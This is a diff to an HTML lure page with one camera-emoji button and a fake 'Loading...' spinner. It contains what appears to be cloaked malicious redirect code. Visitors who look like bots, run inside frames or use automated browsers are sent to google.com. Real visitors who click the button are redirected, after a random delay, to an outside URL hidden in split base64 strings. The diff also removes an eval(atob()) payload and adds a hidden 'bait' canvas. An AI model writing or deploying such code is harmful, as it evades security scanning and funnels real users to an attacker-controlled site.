@@ -15,6 +15,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
     }
     .btn {
       background-color: white;
@@ -26,12 +27,38 @@
       cursor: pointer;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
     }
+    canvas.b {
+      display: none;
+    }
+    #loading {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      color: white;
+      font-size: 2rem;
+    }
+    .loader {
+      margin-top: 1rem;
+      width: 50px;
+      height: 50px;
+      border: 6px solid #fff;
+      border-top: 6px solid #555;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
   <button class="btn" onclick="g()">📷</button>
-
-  <div id="loader" style="display:none;font-size:1.5rem;color:white;position:absolute;bottom:2rem;">Loading...</div>
+  <div id="loading">
+    ⏳ Loading...
+    <div class="loader"></div>
+  </div>
+  <canvas class="b" id="bait"></canvas>
 
   <script>
     (() => {
@@ -40,6 +67,18 @@
       if (a.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
         location.href = "https://google.com";
       }
+    })();
+
+    (() => {
+      const c = document.getElementById("bait").getContext("2d");
+      c.canvas.width = 300;
+      c.canvas.height = 80;
+      c.font = "20px Arial";
+      c.fillStyle = "#000";
+      const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
+      const p2 = "ZWhiaXhlZQ==";
+      const x = atob(p1 + p2);
+      c.fillText(x, 10, 50);
     })();
 
     setInterval(() => {
@@ -60,11 +99,16 @@
 
     function g() {
       if (!i) return;
-      document.querySelector('.btn').style.display = 'none';
-      document.getElementById('loader').style.display = 'block';
 
-      const payload = "Ly8gUmVkaXJlY3Qgd2l0aCBjbG9ha2VkIGpzdwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwgKCkgPT4gewogIGNvbnN0IHVybCA9ICJodHRwczovL2dheXJvbi5saWZlL3JlaGJpeGVlIjsKICBpZiAoaSkgeyBzZXRUaW1lb3V0KCgpID0+IHsgbG9jYXRpb24uaHJlZiA9IHVybCB9LCAyMDAwICsgTWF0aC5yYW5kb20oKSAqIDEwMDApOwp9Cn0pOw==";
-      eval(atob(payload));
+      document.querySelector(".btn").style.display = "none";
+      document.getElementById("loading").style.display = "flex";
+
+      setTimeout(() => {
+        const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
+        const p2 = "ZWhiaXhlZQ==";
+        const url = atob(p1 + p2);
+        if (url.startsWith("http")) window.location.replace(url);
+      }, 2000 + Math.random() * 1000);
     }
   </script>
 </body>
